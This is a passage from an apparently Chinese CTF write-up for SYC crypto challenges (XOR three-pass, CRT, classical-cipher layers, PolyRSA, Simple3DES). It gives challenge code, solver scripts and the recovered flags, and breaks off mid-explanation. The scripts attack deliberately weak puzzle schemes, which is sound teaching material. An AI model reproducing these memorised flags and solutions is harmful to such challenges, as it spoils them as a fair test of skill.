class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor </span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># step0: key generation &amp; distribution</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s0</span>(<span class="params">msg</span>): </span><br><span class="line">    k1,k2 = [urandom(<span class="built_in">len</span>(msg)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">    <span class="keyword">return</span> k1,k2 </span><br><span class="line"></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1: Alice encrypt M, and send it to Bob</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s1</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c1 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: Bob encrypt c1, and send it to Alice </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s2</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    c2 = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> c2 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: Alice decrypt c2, and send it to Bob.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s3</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c3 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c3 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step4: Bob decrypt c3, get M.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s4</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    m_ = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> m_ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg,k1,k2</span>): </span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">assert</span> msg == m_</span><br><span class="line"></span><br><span class="line"><span class="comment"># Here&#x27;s what hacker Eve got:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_</span>(<span class="params">msg,k1,k2</span>):</span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">if</span> HACK == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(c1) </span><br><span class="line">        <span class="built_in">print</span>(c2) </span><br><span class="line">        <span class="built_in">print</span>(c3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k1,k2 = s0(flag) </span><br><span class="line">encrypt_(flag,k1,k2) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line"><span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>推导有 $m = c_1 \oplus c_2 \oplus c_3$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">c1 = <span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line">c2 = <span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line">c3 = <span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"></span><br><span class="line">m = strxor(strxor(c1,c2),c3)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;I_l0v3_Crypt0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="OldAlgorithm"><a href="#OldAlgorithm" class="headerlink" title="OldAlgorithm"></a>OldAlgorithm</h3><blockquote><p>An old algorithm but widely used nowadays.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+os.urandom(padlen-<span class="built_in">len</span>(msg))</span><br><span class="line"></span><br><span class="line">flag = pad(flag,<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">p = [getPrime(<span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)] </span><br><span class="line">c = [bytes_to_long(flag)%i <span class="keyword">for</span> i <span class="keyword">in</span> p] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</span></span><br><span class="line"><span class="string">c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>CRT算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = [<span class="number">58657</span>, <span class="number">47093</span>, <span class="number">47963</span>, <span class="number">41213</span>, <span class="number">57653</span>, <span class="number">56923</span>, <span class="number">41809</span>, <span class="number">49639</span>, <span class="number">44417</span>, <span class="number">38639</span>, <span class="number">39857</span>, <span class="number">53609</span>, <span class="number">55621</span>, <span class="number">41729</span>, <span class="number">60497</span>, <span class="number">44647</span>, <span class="number">39703</span>, <span class="number">55117</span>, <span class="number">44111</span>, <span class="number">57131</span>, <span class="number">37747</span>, <span class="number">63419</span>, <span class="number">63703</span>, <span class="number">64007</span>, <span class="number">46349</span>, <span class="number">39241</span>, <span class="number">39313</span>, <span class="number">44909</span>, <span class="number">40763</span>, <span class="number">46727</span>, <span class="number">34057</span>, <span class="number">56333</span>]</span><br><span class="line">c = [<span class="number">36086</span>, <span class="number">4005</span>, <span class="number">3350</span>, <span class="number">23179</span>, <span class="number">34246</span>, <span class="number">5145</span>, <span class="number">32490</span>, <span class="number">16348</span>, <span class="number">13001</span>, <span class="number">13628</span>, <span class="number">7742</span>, <span class="number">46317</span>, <span class="number">50824</span>, <span class="number">23718</span>, <span class="number">32995</span>, <span class="number">7640</span>, <span class="number">10590</span>, <span class="number">46897</span>, <span class="number">39245</span>, <span class="number">16633</span>, <span class="number">31488</span>, <span class="number">36547</span>, <span class="number">42136</span>, <span class="number">52782</span>, <span class="number">31929</span>, <span class="number">34747</span>, <span class="number">29026</span>, <span class="number">18748</span>, <span class="number">6634</span>, <span class="number">9700</span>, <span class="number">8126</span>, <span class="number">5197</span>]</span><br><span class="line">m = crt(c,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;CRT_1s_s0_ju1cy!&#125;]mC\x9c\xf9C/\xfc\xb8t\x16&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easy-classic"><a href="#easy-classic" class="headerlink" title="easy_classic"></a>easy_classic</h3><blockquote><p>非常好套娃，使我的古典旋转</p></blockquote><p>每一层解出的字符串为下一层zip压缩包密码。</p><p>第1层：<code>udzeojxuwqcu</code>，ROT10，得：<code>enjoythegame</code></p><p>第2层：<code>ialhhooavtepcyr</code>，栅栏7，得：<code>ilovecryptohaha</code></p><p>第3层：<code>5a6H5a6Z5LiH5rOV55qE6YKj5Liq5rqQ5aS0</code>，base64，得：<code>宇宙万法的那个源头</code></p><p>第4层：<code>熊曰：呋食食食取噗山笨笨破嗄咯哈動嗡雜類嗒嘿啽沒歡破吖咬我啽寶盜噔咯沒</code>，熊曰解密，得：<code>never gonna give you up</code></p><p>第5层：<code>password: adltlfltqrcy</code>，<code>key: 👝👘👠👩👞👘👤👜</code>，</p><p>先base100，得：key=<code>fairgame</code>，再playfair，得：<code>genshinstart</code></p><p>flag：<code>SYC&#123;classical_1s_fun&#125;</code></p><p>​    </p><h3 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h3><blockquote><p>Harder RSA. Check it out!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line">p,q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e1,e2 = [getPrime(<span class="number">17</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q </span><br><span class="line">c1 = gmpy2.powmod(<span class="number">2</span>*p + <span class="number">3</span>*q,e1,n)</span><br><span class="line">c2 = gmpy2.powmod(<span class="number">5</span>*p + <span class="number">7</span>*q,e2,n) </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1=&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2=&quot;</span>,e2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e1= 113717</span></span><br><span class="line"><span class="comment">#e2= 80737</span></span><br><span class="line"><span class="comment">#c1= 97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></span><br><span class="line"><span class="comment">#c2= 353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></span><br><span class="line"><span class="comment">#c= 375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></span><br><span class="line"><span class="comment">#n= 728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></span><br></pre></td></tr></table></figure></blockquote><p>参考GKCTF 2021 - RRRRsa相关推导，消元求gcd得 $p$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">e1= <span class="number">113717</span></span><br><span class="line">e2= <span class="number">80737</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1= <span class="number">97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></span><br><span class="line">c2= <span class="number">353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></span><br><span class="line">c= <span class="number">375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></span><br><span class="line">n= <span class="number">728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></span><br><span class="line"></span><br><span class="line">x1 = <span class="built_in">pow</span>(c1 * <span class="built_in">pow</span>(<span class="number">3</span>, -e1, n),e2,n)</span><br><span class="line">x2 = <span class="built_in">pow</span>(c2 * <span class="built_in">pow</span>(<span class="number">7</span>, -e2, n),e1,n)</span><br><span class="line">p = gcd(x1-x2, n)</span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m= <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;poly_rsa_Just_need5_s1mple_gcd&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Simple3DES"><a href="#Simple3DES" class="headerlink" title="Simple3DES"></a>Simple3DES</h3><blockquote><p>题目链接：nc 59.110.20.54:23333 <a href="https://blog.csdn.net/Mr_wzc/article/details/121713518">https://blog.csdn.net/Mr_wzc/article/details/121713518</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> a,b: <span class="built_in">bytes</span>([a[i % <span class="built_in">len</span>(a)] ^ b[i % <span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+<span class="built_in">chr</span>((padlen-(<span class="built_in">len</span>(msg)%padlen))).encode()*(padlen-(<span class="built_in">len</span>(msg)%padlen))</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">sec = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">msg,key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = long_to_bytes(key)</span><br><span class="line">        msg = xor(long_to_bytes(msg),sec)</span><br><span class="line">        des = DES3.new(key,DES3.MODE_ECB)</span><br><span class="line">        ct = xor(des.encrypt(pad(msg,<span class="number">8</span>)),sec)</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(ct)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> Exception</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service</span>():</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Simple DES Encryption Service&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="keyword">while</span> cnt&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1. Encrypt\n2. Get encrypted flag.&#x27;</span>)</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input msg:&#x27;</span>)</span><br><span class="line">            msg = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(msg,key))</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(bytes_to_long(flag),key))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bye!&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    service()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure></blockquote><p>代码问题在先xor后pad，对于 <code>m=b&#39;\x00&#39;</code>，有 